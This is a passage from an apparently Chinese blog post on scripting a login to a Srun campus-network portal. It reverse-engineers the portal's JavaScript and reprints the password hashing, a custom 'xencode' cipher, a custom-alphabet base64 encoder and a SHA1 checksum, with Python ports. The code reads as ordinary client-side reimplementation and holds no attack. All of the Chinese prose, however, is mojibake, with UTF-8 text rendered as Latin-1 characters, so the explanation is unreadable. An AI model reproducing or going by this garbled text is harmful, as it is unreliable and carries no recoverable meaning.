¡éªŒä¹‹åè°ƒç”¨äº†portalçš„loginæ–¹æ³•å»ç™»å½•ï¼Œå¹¶ä¸”è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ä¹Ÿéƒ½ä¼ è¿›äº†portalç›¸åº”çš„å˜é‡å½“ä¸­ï¼Œé‚£ä¹ˆå°±å»portal.jsæ–‡ä»¶ä¸­åˆ†æã€‚</p><p>å‘ç°æ–‡ä»¶å¾ˆå¤§ï¼Œé€‰æ‹©æ‹·è´ä¸€ä»½æ”¾ideä¸­åˆ†æï¼Œå¯»æ‰¾loginå‡½æ•°ï¼Œ</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/2.png" alt="2"></p><p>å¯ä»¥å‘ç°è¿™é‡Œä¸»è¦æ˜¯è¿›è¡Œç™»å½•ç±»å‹åˆ¤æ–­ï¼Œè¿›è¡Œé€‰æ‹©ï¼Œé‚£å°±æ¥ç€è¿½è¸ªã€‚</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/3.png" alt="3"></p><p>å¯ä»¥å‘ç°æ˜¯ç”¨ä¸€ä¸ª_loginAccountå‡½æ•°å»ç™»å½•çš„ï¼Œè€Œè¿™ä¸ªå‡½æ•°å°±åœ¨ä¸‹é¢ï¼Œæˆ‘ä»¬çœ‹çœ‹å®ƒçš„é€»è¾‘ã€‚</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/8.png" alt="3"></p><p>è¿™é‡Œä¸»è¦æœ‰ä¸€ä¸ªgetTokenå‡½æ•°,ç„¶åå¯†ç ç”¨passwordå’Œtokenè¿›è¡Œäº†md5åŠ ç›çš„hashåŠ å¯†ï¼Œå› æ­¤passwordå­—æ®µå°±å¾ˆå®¹æ˜“å¾—å‡ºæ¥äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ç€çœ‹çœ‹tokenæ€ä¹ˆè·å–çš„ï¼Œä¹‹å‰æˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨è¯·æ±‚çŒœæµ‹challengeå­—æ®µæ˜¯å¯èƒ½æ˜¯tokenï¼Œè¿™æ¬¡æˆ‘ä»¬è·Ÿè¸ª_getTokenå‡½æ•°çœ‹çœ‹ã€‚</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/9.png" alt="3"></p><p>å‘ç°è¿™é‡Œè¿”å›äº†res.challengeï¼Œé‚£ä¹ˆå°±å¯ä»¥å¤§èƒ†æ¨å®šåˆšåˆšçš„challengeå°±æ˜¯tokenäº†ã€‚é‚£ä¹ˆç™»å½•çš„æµç¨‹åº”è¯¥å°±æ˜¯ï¼Œå…ˆå»è¯·æ±‚ä¸€ä¸ªtokenï¼Œç„¶åç”¨tokenè¿›è¡ŒåŠ å¯†ç™»å½•ã€‚è¿™é‡Œå…ˆç»™å‡ºmd5åŠ å¯†çš„è„šæœ¬ï¼Œè¿™é‡Œå‚è€ƒäº†åˆ«çš„å¸ˆå‚…çš„åšå®¢çš„åšæ³•ï¼Œåœ¨è¿™é‡Œâ€”-&gt;<a href="https://blog.csdn.net/qq_41797946/article/details/89417722">ä¼ é€é—¨</a>ï¼Œæˆ‘ä¹Ÿä¸€ç›´æ²¡ç†è§£å®ƒç›æ˜¯æ€ä¹ˆåŠ çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_md5.py</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span>(<span class="params">password,token</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hmac.new(token.encode(), password.encode(), hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure><h3 id="chksumå’ŒinfoåŠ å¯†"><a href="#chksumå’ŒinfoåŠ å¯†" class="headerlink" title="chksumå’ŒinfoåŠ å¯†"></a>chksumå’ŒinfoåŠ å¯†</h3><p>ç¿»åˆ°åé¢å¯ä»¥ç›´æ¥çœ‹åˆ°urlçš„è¯·æ±‚å‚æ•°ã€‚</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/10.png" alt="3"></p><p>urlå¯ä»¥ç›´æ¥æŠ“åŒ…è·å¾—ï¼Œè¿™ä¸ªæ²¡å¿…è¦å»åˆ†æå®ƒçš„urlæ˜¯å•¥ï¼Œä¸»è¦çœ‹æˆ‘ä»¬ä¹‹å‰éœ€è¦çŸ¥é“çš„ä¸‰ä¸ªå­—æ®µï¼Œè¿™é‡Œç¬¬äºŒç‚¹ä¸å¤ªæ˜ç™½äº†ï¼Œè™½ç„¶çœ‹åˆ°å®ƒçš„æŒ¡è·¯æ–¹å¼å¥½åƒæ˜¯OTPï¼Œä½†æ˜¯æŠ“åŒ…è·å¾—çš„ä¸€ç›´æ˜¯{md5}ï¼Œä¹Ÿä¸å¤ªæ‡‚ä¸ºå•¥ï¼Œä½†æ˜¯æˆ‘ä»¬å§‘ä¸”é€‰æ‹©åè€…ï¼Œæ¯•ç«Ÿå®è·µæ‰æ˜¯æ£€éªŒçœŸç†çš„å”¯ä¸€æ ‡å‡†å˜›ã€‚</p><p>è¿™é‡Œpasswordçš„hmd5æˆ‘ä»¬å‰é¢å·²ç»å¯ä»¥ç®—äº†ï¼Œæ¥ä¸‹æ¥è¿™ä¸ªinfoçš„å‚æ•°æ˜¯iï¼Œchksumçš„å‚æ•°æ˜¯sha1(str)ï¼Œå¯¹strè¿›è¡Œäº†sha1åŠ å¯†ã€‚é‚£ä¹ˆæˆ‘ä»¬å¾€ä¸Šçœ‹çœ‹è¿™ä¸ªiå’Œè¿™ä¸ªstræ˜¯æ€ä¹ˆè·å¾—çš„ã€‚</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/11.png" alt="3"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°stråªæ˜¯å¯¹ä¸€äº›å‚æ•°è¿›è¡Œäº†ç›¸åŠ ï¼Œæœ€åsha1æ•£åˆ—ã€‚</p><p>é‚£ä¹ˆå¦‚æ­¤ä¸€æ¥æˆ‘ä»¬åªéœ€è¦å¾—åˆ°iå°±å¯ä»¥æŠŠæ•´ä¸ªurlçš„å‚æ•°æ„é€ å®Œæˆäº†ã€‚</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/12.png" alt="3"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯è°ƒç”¨äº†_encodeUserInfoå‡½æ•°å»åŠ å¯†å¾—åˆ°içš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›ä¸€æ­¥æœç´¢è¿™ä¸ªå‡½æ•°çš„åŠ å¯†æ–¹å¼ã€‚</p><p>è¿™é‡Œæˆ‘ç›´æ¥è´´å‡ºæ¥è¿™ä¸ªåŠ å¯†çš„å‡½æ•°äº†ã€‚</p><h3 id="åŠ å¯†å®ç°è„šæœ¬"><a href="#åŠ å¯†å®ç°è„šæœ¬" class="headerlink" title="åŠ å¯†å®ç°è„šæœ¬"></a>åŠ å¯†å®ç°è„šæœ¬</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">_encodeUserInfo.set(_assertThisInitialized(_this), &#123;</span><br><span class="line">      <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">value</span>: <span class="function"><span class="keyword">function</span> <span class="title">value</span>(<span class="params">info, token</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// å…‹éš†è‡ª $.base64ï¼Œé˜²æ­¢æ±¡æŸ“</span></span><br><span class="line">        <span class="keyword">var</span> base64 = _this.clone($.base64); <span class="comment">// base64 è®¾ç½® Alpha</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        base64.setAlpha(<span class="string">&#x27;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&#x27;</span>); <span class="comment">// ç”¨æˆ·ä¿¡æ¯è½¬ JSON</span></span><br><span class="line"></span><br><span class="line">        info = <span class="built_in">JSON</span>.stringify(info);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">str, key</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (str === <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">var</span> v = s(str, <span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">var</span> k = s(key, <span class="literal">false</span>);</span><br><span class="line">          <span class="keyword">if</span> (k.length &lt; <span class="number">4</span>) k.length = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">var</span> n = v.length - <span class="number">1</span>,</span><br><span class="line">              z = v[n],</span><br><span class="line">              y = v[<span class="number">0</span>],</span><br><span class="line">              c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span>,</span><br><span class="line">              m,</span><br><span class="line">              e,</span><br><span class="line">              p,</span><br><span class="line">              q = <span class="built_in">Math</span>.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>)),</span><br><span class="line">              d = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> (<span class="number">0</span> &lt; q--) &#123;</span><br><span class="line">            d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>);</span><br><span class="line">            e = d &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n; p++) &#123;</span><br><span class="line">              y = v[p + <span class="number">1</span>];</span><br><span class="line">              m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">              m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">              m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">              z = v[p] = v[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">            m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">            m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">            z = v[n] = v[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> l(v, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> c = a.length;</span><br><span class="line">          <span class="keyword">var</span> v = [];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; c; i += <span class="number">4</span>) &#123;</span><br><span class="line">            v[i &gt;&gt; <span class="number">2</span>] = a.charCodeAt(i) | a.charCodeAt(i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | a.charCodeAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span> | a.charCodeAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) v[v.length] = c;</span><br><span class="line">          <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> d = a.length;</span><br><span class="line">          <span class="keyword">var</span> c = d - <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) &#123;</span><br><span class="line">            <span class="keyword">var</span> m = a[d - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (m &lt; c - <span class="number">3</span> || m &gt; c) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            c = m;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; d; i++) &#123;</span><br><span class="line">            a[i] = <span class="built_in">String</span>.fromCharCode(a[i] &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> b ? a.join(<span class="string">&#x27;&#x27;</span>).substring(<span class="number">0</span>, c) : a.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#123;SRBX1&#125;&#x27;</span> + base64.encode(encode(info, token));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå¾—æ„Ÿè°¢è¿™ä½å¤§ä½¬å°†è¿™ä¸ªjsè½¬æˆäº†pythonè„šæœ¬ï¼Œæˆ‘å°±ç›´æ¥è´´ç»“æœäº†,é‡Œé¢è¿˜æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„base64ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸è‡ªå·±å†™äº†ï¼Œç›´æ¥è´´å§å“ˆå“ˆå“ˆã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_xencode.py</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force</span>(<span class="params">msg</span>):</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> msg:</span><br><span class="line">        ret.append(<span class="built_in">ord</span>(w))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ordat</span>(<span class="params">msg, idx</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; idx:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(msg[idx])</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    pwd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, <span class="number">4</span>):</span><br><span class="line">        pwd.append(</span><br><span class="line">            ordat(msg, i) | ordat(msg, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | ordat(msg, i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">            | ordat(msg, i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        pwd.append(l)</span><br><span class="line">    <span class="keyword">return</span> pwd</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    ll = (l - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        m = msg[l - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> m &lt; ll - <span class="number">3</span> <span class="keyword">or</span> m &gt; ll:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        ll = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l):</span><br><span class="line">        msg[i] = <span class="built_in">chr</span>(msg[i] &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(</span><br><span class="line">            msg[i] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)[<span class="number">0</span>:ll]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    pwd = sencode(msg, <span class="literal">True</span>)</span><br><span class="line">    pwdk = sencode(key, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwdk) &lt; <span class="number">4</span>:</span><br><span class="line">        pwdk = pwdk + [<span class="number">0</span>] * (<span class="number">4</span> - <span class="built_in">len</span>(pwdk))</span><br><span class="line">    n = <span class="built_in">len</span>(pwd) - <span class="number">1</span></span><br><span class="line">    z = pwd[n]</span><br><span class="line">    y = pwd[<span class="number">0</span>]</span><br><span class="line">    c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span></span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    q = math.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>))</span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; q:</span><br><span class="line">        d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>)</span><br><span class="line">        e = d &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p &lt; n:</span><br><span class="line">            y = pwd[p + <span class="number">1</span>]</span><br><span class="line">            m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">            m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">            m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">            pwd[p] = pwd[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>)</span><br><span class="line">            z = pwd[p]</span><br><span class="line">            p = p + <span class="number">1</span></span><br><span class="line">        y = pwd[<span class="number">0</span>]</span><br><span class="line">        m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">        m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">        m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">        pwd[n] = pwd[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>)</span><br><span class="line">        z = pwd[n]</span><br><span class="line">        q = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lencode(pwd, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_base64.py</span></span><br><span class="line">_PADCHAR = <span class="string">&quot;=&quot;</span></span><br><span class="line">_ALPHA = <span class="string">&quot;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_getbyte</span>(<span class="params">s, i</span>):</span></span><br><span class="line">    <span class="comment">#print(s,&#x27; &#x27;,i)</span></span><br><span class="line">    x = <span class="built_in">ord</span>(s[i]);</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">255</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;INVALID_CHARACTER_ERR: DOM Exception 5&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">s</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    b10=<span class="number">0</span></span><br><span class="line">    x = []</span><br><span class="line">    imax = <span class="built_in">len</span>(s) - <span class="built_in">len</span>(s) % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,imax,<span class="number">3</span>):</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>) | _getbyte(s, i + <span class="number">2</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[(b10 &amp; <span class="number">63</span>)])</span><br><span class="line">    i=imax</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) - imax ==<span class="number">1</span>:</span><br><span class="line">        b10 = _getbyte(s, i) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _PADCHAR + _PADCHAR);</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(s) - imax == <span class="number">2</span>:</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)] + _PADCHAR);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(x)</span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_sha1.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sha1</span>(<span class="params">value</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(value.encode()).hexdigest()</span><br></pre></td></tr></table></figure><p>é€»è¾‘è¿™ä¹ˆåˆ†æåˆ°ä½äº†ä¹‹åæ¥ä¸‹æ¥å°±å¼€å§‹å†™ä¸¤æ¬¡æŠ“åŒ…çš„è„šæœ¬å§ï¼Œè¿™é‡Œä¹Ÿç›´æ¥ç»™äº†ï¼Œæ¯•ç«Ÿé€»è¾‘å°±çœŸçš„è¿™ä¹ˆç‚¹ï¼Œä¸»è¦çš„å·¥ä½œé‡éƒ½åœ¨jsè½¬pythonä¸Šé¢ï¼Œè€Œå·²ç»æœ‰äººè½¬å¥½äº†æˆ‘å°±ç›´æ¥æ‹¿è¿‡æ¥ç”¨äº†ï¼Œè¿™é‡Œå†æ¬¡é¸£è°¢huxiaofan1223å¤§ä½¬ï¼Œæœ¬ç¯‡åšå®¢ä¹Ÿè´´åœ¨ä¸Šé¢çš„ä¼ é€é—¨å½“ä¸­äº†ã€‚</p><h2 id="æ¨¡æ‹Ÿç™»å½•"><a href="#æ¨¡æ‹Ÿç™»å½•" class="headerlink" 